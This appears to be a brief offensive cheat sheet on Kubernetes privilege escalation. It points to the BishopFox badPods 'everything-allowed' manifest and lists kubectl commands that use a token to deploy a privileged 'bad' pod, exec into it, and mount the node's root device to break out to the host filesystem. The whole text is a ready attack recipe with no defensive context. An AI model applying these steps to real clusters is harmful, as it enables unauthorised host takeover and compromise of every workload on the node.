## Example:

### If we have admin access to the cluster, we can create any resources we want.

### We can create a "bad" pod that mounts the node's file system.

## EVERYTHING-ALLOWED-EXEC-POD: https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

## STEPS:

#### 1) Pull a container image (minikube's local docker registry) 

#### 2) 

    kubectl apply -f BAD_POD.yml --token={TOKEN} (Create the "bad" pod for privesc)

#### 3) 

    kubectl get pods --token={TOKEN}

#### 4) 

    kubectl exec -it BAD_POD --token={TOKEN} -- /bin/bash

## Breakout of the Kubernetes environment

### After we created an ran our malicious pod, we can escape the Kubernetes environment by mounting the file system to the /tmp directory (example)

#### 1) 

    mount /dev/root /tmp

#### 2) 

    cd /tmp

#### 3) GGWP!
